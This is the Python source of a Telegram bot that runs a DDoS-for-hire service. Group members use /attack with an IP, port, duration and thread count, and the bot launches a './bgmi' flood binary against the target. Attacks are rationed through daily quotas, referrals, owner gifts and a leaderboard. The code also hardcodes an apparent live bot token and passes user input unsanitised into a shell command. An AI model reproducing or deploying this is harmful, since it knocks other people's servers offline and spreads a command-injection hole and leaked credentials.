import os
import asyncio
import logging
import uuid
import time
import httpx
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

# Configure HTTPX to be more resilient
httpx._config.DEFAULT_TIMEOUT_CONFIG = 10.0  # Set default timeout to 10 seconds

# Suppress HTTP request logs
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Bot Configuration
TELEGRAM_BOT_TOKEN = '8146585403:AAFJYRvEErZ9NuZ9ufyf8cvXyWOzs0lIB4k'
OWNER_USERNAME = "Riyahacksyt"
ALLOWED_GROUP_ID = -1002491572572
MAX_THREADS = 1500
max_duration = 120
daily_attack_limit = 3

# Attack & Feedback System
attack_running = False
user_attacks = {}
feedback_waiting = {}
attack_ban_list = {}

# Referral System
referral_codes = {}
referral_rewards = {}
referral_history = {}

# Custom Keyboard for Regular Users
regular_user_keyboard = [['🚀 Start', '⚔️ Attack'], ['🏆 Leaderboard']]
regular_user_markup = ReplyKeyboardMarkup(regular_user_keyboard, resize_keyboard=True)

# Custom Keyboard for Owner
owner_keyboard = [
    ['🚀 Start', '⚔️ Attack'],
    ['🔄 Reset Attacks', '⏱ Set Duration', '🧵 Set Threads'],
    ['🏆 Leaderboard', '🎖 Reward Top Referrer', '🎁 Gift Attacks']
]
owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)

# Scripts Folder
SCRIPTS_FOLDER = "scripts"

def load_scripts(application):
    if not os.path.exists(SCRIPTS_FOLDER):
        os.makedirs(SCRIPTS_FOLDER)
        logging.info(f"Created scripts folder: {SCRIPTS_FOLDER}")
        return

    for filename in os.listdir(SCRIPTS_FOLDER):
        if filename.endswith(".py"):
            try:
                script_path = os.path.join(SCRIPTS_FOLDER, filename)
                spec = importlib.util.spec_from_file_location(filename[:-3], script_path)
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)

                if hasattr(module, "register_handlers"):
                    module.register_handlers(application)
                    logging.info(f"Loaded script: {filename}")
            except Exception as e:
                logging.error(f"Error loading script {filename}: {e}")

def is_allowed_group(update: Update):
    try:
        chat = update.effective_chat
        return chat.type in ['group', 'supergroup'] and chat.id == ALLOWED_GROUP_ID
    except Exception as e:
        logging.error(f"Error in is_allowed_group: {e}")
        return False

def is_owner(update: Update):
    try:
        return update.effective_user.username == OWNER_USERNAME
    except Exception as e:
        logging.error(f"Error in is_owner: {e}")
        return False

def generate_referral_code(user_id):
    try:
        if user_id not in referral_codes:
            referral_codes[user_id] = str(uuid.uuid4())[:8]
        return referral_codes[user_id]
    except Exception as e:
        logging.error(f"Error generating referral code: {e}")
        return str(uuid.uuid4())[:8]

async def start(update: Update, context: CallbackContext):
    try:
        chat = update.effective_chat

        if chat.type == "private":
            main_channel_link = "https://t.me/+wnHGZwkgKBo0ZDdl"
            await update.message.reply_text(
                f"🌟 *Welcome!* 🌟\n\n"
                f"🔗 *Join our main channel for free 180 sec server hack:* {main_channel_link}\n\n"
                "*Use the bot in the allowed group for attacks and referrals!*",
                parse_mode='Markdown'
            )
            return

        if not is_allowed_group(update):
            return

        user_id = update.effective_user.id
        if user_id not in user_attacks:
            user_attacks[user_id] = daily_attack_limit

        referral_code = generate_referral_code(user_id)
        referral_link = f"https://t.me/{context.bot.username}?start={referral_code}"

        message = (
            "*🔥 Welcome to the battlefield! 🔥*\n\n"
            "*Use ⚔️ Attack to start an attack!*\n\n"
            f"⚔️ *You have {user_attacks[user_id]} attacks left today!* ⚔️\n\n"
            "*💥 Let the war begin!*\n\n"
            f"🔗 *Your Referral Link:* `{referral_link}`\n"
            "*Invite friends to earn extra attacks!*"
        )

        if is_owner(update):
            await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=owner_markup)
        else:
            await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=regular_user_markup)
    except Exception as e:
        logging.error(f"Error in start command: {e}")
        await update.message.reply_text("⚠️ An error occurred. Please try again.", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_running
    try:
        if not is_allowed_group(update):
            return

        user_id = update.effective_user.id

        if user_id in attack_ban_list:
            await update.message.reply_text("❌ *You are banned from using the attack command for 10 minutes!*", parse_mode='Markdown')
            return

        if attack_running:
            await update.message.reply_text("⚠️ *Please wait! Another attack is already running.*", parse_mode='Markdown')
            return

        if user_id not in user_attacks:
            user_attacks[user_id] = daily_attack_limit

        if user_attacks[user_id] <= 0:
            referral_code = generate_referral_code(user_id)
            referral_link = f"https://t.me/{context.bot.username}?start={referral_code}"
            await update.message.reply_text(
                "❌ *You have used all your daily attacks!*\n\n"
                f"🔗 *Refer friends using your link to earn more attacks:* `{referral_link}`",
                parse_mode='Markdown'
            )
            return

        if update.message.text == '⚔️ Attack':
            await update.message.reply_text("⚠️ *Please use the /attack command with arguments: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
            return

        args = context.args
        if len(args) != 4:
            await update.message.reply_text("⚠️ *Usage: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
            return

        ip, port, duration, threads = args
        duration = int(duration)
        threads = int(threads)

        if duration > max_duration:
            await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
            return

        if threads > MAX_THREADS:
            await update.message.reply_text(f"❌ *Number of threads exceeds the max limit ({MAX_THREADS})!*", parse_mode='Markdown')
            return

        attack_running = True
        user_attacks[user_id] -= 1
        remaining_attacks = user_attacks[user_id]

        feedback_waiting[user_id] = True

        await update.message.reply_text(
            f"⚔️ *Attack Started!*\n"
            f"🎯 *Target*: {ip}:{port}\n"
            f"🕒 *Duration*: {duration} sec\n"
            f"🧵 *Threads*: {threads}\n"
            f"🔥 *Let the battlefield ignite! 💥*\n\n"
            f"💥 *You have {remaining_attacks} attacks left today!*\n\n"
            "📸 *Please send a photo feedback before the attack completes, or you will be banned for 10 minutes!*",
            parse_mode='Markdown'
        )

        asyncio.create_task(run_attack(update.effective_chat.id, ip, port, duration, threads, context, user_id))
    except Exception as e:
        logging.error(f"Error in attack command: {e}")
        attack_running = False
        await update.message.reply_text("❌ *An error occurred while starting the attack. Please try again.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, threads, context, user_id):
    global attack_running
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} {threads}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        try:
            await asyncio.wait_for(process.communicate(), timeout=duration + 10)
        except asyncio.TimeoutError:
            process.kill()
            await context.bot.send_message(chat_id=chat_id, text="⚠️ *Attack process timed out!*", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error during attack: {e}")
        await context.bot.send_message(chat_id=chat_id, text="❌ *An error occurred during the attack!*", parse_mode='Markdown')

    finally:
        attack_running = False
        if feedback_waiting.get(user_id):
            await context.bot.send_message(chat_id=chat_id, text=f"❌ *You didn't send feedback! You are banned from using the attack command for 10 minutes!*", parse_mode='Markdown')
            attack_ban_list[user_id] = True
            asyncio.create_task(unban_user_after_delay(user_id, 600))
        else:
            await context.bot.send_message(chat_id=chat_id, text="✅ *Attack Finished, now next attack!*", parse_mode='Markdown')

async def unban_user_after_delay(user_id, delay):
    await asyncio.sleep(delay)
    attack_ban_list.pop(user_id, None)

async def handle_photo(update: Update, context: CallbackContext):
    try:
        user_id = update.effective_user.id
        if user_id in feedback_waiting:
            del feedback_waiting[user_id]
            await update.message.reply_text("✅ *Thanks for your feedback!*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error handling photo: {e}")

async def reset_attacks(update: Update, context: CallbackContext):
    try:
        if not is_owner(update):
            await update.message.reply_text("❌ *Only the owner can reset attacks!*", parse_mode='Markdown')
            return

        for user_id in user_attacks:
            user_attacks[user_id] = daily_attack_limit

        await update.message.reply_text(f"✅ *All users' attack limits have been reset to {daily_attack_limit}!*")
    except Exception as e:
        logging.error(f"Error resetting attacks: {e}")
        await update.message.reply_text("❌ *Failed to reset attacks. Please try again.*", parse_mode='Markdown')

async def set_duration(update: Update, context: CallbackContext):
    global max_duration
    try:
        if not is_owner(update):
            await update.message.reply_text("❌ *Only the owner can set max attack duration!*", parse_mode='Markdown')
            return

        if update.message.text == '⏱ Set Duration':
            await update.message.reply_text("⚠️ *Please use the /setduration command with arguments: /setduration <max_duration_sec>*", parse_mode='Markdown')
            return

        args = context.args
        if len(args) != 1 or not args[0].isdigit():
            await update.message.reply_text("⚠️ *Usage: /setduration <max_duration_sec>*", parse_mode='Markdown')
            return

        max_duration = int(args[0])
        await update.message.reply_text(f"✅ *Maximum attack duration set to {max_duration} seconds!*")
    except Exception as e:
        logging.error(f"Error setting duration: {e}")
        await update.message.reply_text("❌ *Failed to set duration. Please try again.*", parse_mode='Markdown')

async def set_threads(update: Update, context: CallbackContext):
    global MAX_THREADS
    try:
        if not is_owner(update):
            await update.message.reply_text("❌ *Only the owner can set max threads!*", parse_mode='Markdown')
            return

        if update.message.text == '🧵 Set Threads':
            await update.message.reply_text("⚠️ *Please use the /set_threads command with arguments: /set_threads <max_threads>*", parse_mode='Markdown')
            return

        args = context.args
        if len(args) != 1 or not args[0].isdigit():
            await update.message.reply_text("⚠️ *Usage: /set_threads <max_threads>*", parse_mode='Markdown')
            return

        MAX_THREADS = int(args[0])
        await update.message.reply_text(f"✅ *Maximum threads set to {MAX_THREADS}!*")
    except Exception as e:
        logging.error(f"Error setting threads: {e}")
        await update.message.reply_text("❌ *Failed to set threads. Please try again.*", parse_mode='Markdown')

async def show_leaderboard(update: Update, context: CallbackContext):
    try:
        if not is_allowed_group(update):
            return

        sorted_referrals = sorted(referral_rewards.items(), key=lambda x: x[1], reverse=True)

        leaderboard_message = "🏆 *Top Referrers Leaderboard* 🏆\n\n"
        
        for i, (user_id, referrals) in enumerate(sorted_referrals[:10], start=1):
            try:
                user = await context.bot.get_chat(user_id)
                username = user.username or user.first_name or f"User {user_id}"

                if i == 1:
                    leaderboard_message += f"👑 *{i}. {username}: {referrals} referrals*\n"
                else:
                    leaderboard_message += f"{i}. {username}: {referrals} referrals\n"
            except Exception as e:
                logging.error(f"Error getting user info for {user_id}: {e}")
                leaderboard_message += f"{i}. User {user_id}: {referrals} referrals\n"

        if len(sorted_referrals) > 0:
            leaderboard_message += "\n🎖 *The top referrer will receive extra attacks as a reward!*"
        else:
            leaderboard_message += "\nNo referrals yet. Be the first to refer friends!"

        await update.message.reply_text(leaderboard_message, parse_mode='Markdown')
        
    except Exception as e:
        logging.error(f"Error in show_leaderboard: {e}")
        await update.message.reply_text(
            "⚠️ *Could not fetch leaderboard at the moment. Please try again later.*",
            parse_mode='Markdown'
        )

async def reward_top_referrer(update: Update, context: CallbackContext):
    try:
        if not is_owner(update):
            await update.message.reply_text("❌ *Only the owner can reward the top referrer!*", parse_mode='Markdown')
            return

        sorted_referrals = sorted(referral_rewards.items(), key=lambda x: x[1], reverse=True)

        if len(sorted_referrals) == 0:
            await update.message.reply_text("❌ *No referrals found to reward!*", parse_mode='Markdown')
            return

        top_referrer_id, top_referrals = sorted_referrals[0]
        top_referrer = await context.bot.get_chat(top_referrer_id)
        top_referrer_name = top_referrer.username or top_referrer.first_name

        extra_attacks = 5
        if top_referrer_id not in user_attacks:
            user_attacks[top_referrer_id] = daily_attack_limit
        user_attacks[top_referrer_id] += extra_attacks

        await context.bot.send_message(
            chat_id=top_referrer_id,
            text=f"🎉 *Congratulations! You are the top referrer and have been rewarded with {extra_attacks} extra attacks!*\n"
                 f"⚔️ *Total attacks left:* {user_attacks[top_referrer_id]}",
            parse_mode='Markdown'
        )

        await update.message.reply_text(
            f"✅ *{top_referrer_name} has been rewarded with {extra_attacks} extra attacks for being the top referrer!*",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error rewarding top referrer: {e}")
        await update.message.reply_text("❌ *Failed to reward top referrer. Please try again.*", parse_mode='Markdown')

async def gift_attacks(update: Update, context: CallbackContext):
    try:
        if not is_owner(update):
            await update.message.reply_text("❌ *Only the owner can gift attacks!*", parse_mode='Markdown')
            return

        if update.message.text == '🎁 Gift Attacks':
            await update.message.reply_text(
                "⚠️ *Please use the /giftattacks command with arguments: /giftattacks <user_id> <number_of_attacks>*",
                parse_mode='Markdown'
            )
            return

        args = context.args
        if len(args) != 2:
            await update.message.reply_text("⚠️ *Usage: /giftattacks <user_id> <number_of_attacks>*", parse_mode='Markdown')
            return

        user_id, num_attacks = args
        if not user_id.isdigit() or not num_attacks.isdigit():
            await update.message.reply_text("❌ *Invalid user ID or number of attacks!*", parse_mode='Markdown')
            return

        user_id = int(user_id)
        num_attacks = int(num_attacks)

        try:
            user = await context.bot.get_chat(user_id)
        except Exception as e:
            await update.message.reply_text("❌ *User not found!*", parse_mode='Markdown')
            return

        if user_id not in user_attacks:
            user_attacks[user_id] = daily_attack_limit
        user_attacks[user_id] += num_attacks

        await update.message.reply_text(
            f"✅ *{num_attacks} attacks have been gifted to {user.username or user.first_name}!*",
            parse_mode='Markdown'
        )

        await context.bot.send_message(
            chat_id=user_id,
            text=f"🎁 *You have been gifted {num_attacks} extra attacks by the owner!*\n"
                 f"⚔️ *Total attacks left:* {user_attacks[user_id]}",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error gifting attacks: {e}")
        await update.message.reply_text("❌ *Failed to gift attacks. Please try again.*", parse_mode='Markdown')

async def handle_button_click(update: Update, context: CallbackContext):
    try:
        query = update.message.text

        if query == '🚀 Start':
            await start(update, context)
        elif query == '⚔️ Attack':
            await update.message.reply_text("⚠️ *Please use the /attack command with arguments: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
        elif query == '🔄 Reset Attacks':
            await reset_attacks(update, context)
        elif query == '⏱ Set Duration':
            await update.message.reply_text("⚠️ *Please use the /setduration command with arguments: /setduration <max_duration_sec>*", parse_mode='Markdown')
        elif query == '🧵 Set Threads':
            await update.message.reply_text("⚠️ *Please use the /set_threads command with arguments: /set_threads <max_threads>*", parse_mode='Markdown')
        elif query == '🏆 Leaderboard':
            await show_leaderboard(update, context)
        elif query == '🎖 Reward Top Referrer':
            await reward_top_referrer(update, context)
        elif query == '🎁 Gift Attacks':
            await gift_attacks(update, context)
    except Exception as e:
        logging.error(f"Error handling button click: {e}")
        await update.message.reply_text("⚠️ *An error occurred. Please try again.*", parse_mode='Markdown')

async def handle_referral(update: Update, context: CallbackContext):
    try:
        user_id = update.effective_user.id
        args = context.args

        if args and args[0] in referral_codes.values():
            referrer_id = next((uid for uid, code in referral_codes.items() if code == args[0]), None)

            if referrer_id and referrer_id != user_id:
                if referrer_id not in referral_history:
                    referral_history[referrer_id] = set()

                if user_id not in referral_history[referrer_id]:
                    if referrer_id not in referral_rewards:
                        referral_rewards[referrer_id] = 0
                    referral_rewards[referrer_id] += 1
                    user_attacks[referrer_id] += 1

                    referral_history[referrer_id].add(user_id)

                    await context.bot.send_message(
                        chat_id=referrer_id,
                        text=f"🎉 *You have been rewarded with 1 extra attack for a successful referral!*\n"
                             f"⚔️ *Total attacks left:* {user_attacks[referrer_id]}",
                        parse_mode='Markdown'
                    )
                else:
                    await update.message.reply_text(
                        "❌ *You have already referred this user!*",
                        parse_mode='Markdown'
                    )

        await start(update, context)
    except Exception as e:
        logging.error(f"Error handling referral: {e}")
        await update.message.reply_text("⚠️ *An error occurred. Please try again.*", parse_mode='Markdown')

def main():
    while True:
        try:
            application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
            
            # Add handlers
            application.add_handler(CommandHandler("start", handle_referral))
            application.add_handler(CommandHandler("attack", attack))
            application.add_handler(CommandHandler("resetattacks", reset_attacks))
            application.add_handler(CommandHandler("setduration", set_duration))
            application.add_handler(CommandHandler("set_threads", set_threads))
            application.add_handler(CommandHandler("giftattacks", gift_attacks))
            application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
            application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click))

            # Load external scripts
            load_scripts(application)

            application.run_polling()
        except Exception as e:
            logging.error(f"Bot crashed: {e}")
            logging.info("Restarting bot in 10 seconds...")
            time.sleep(10)

if __name__ == '__main__':
    main()
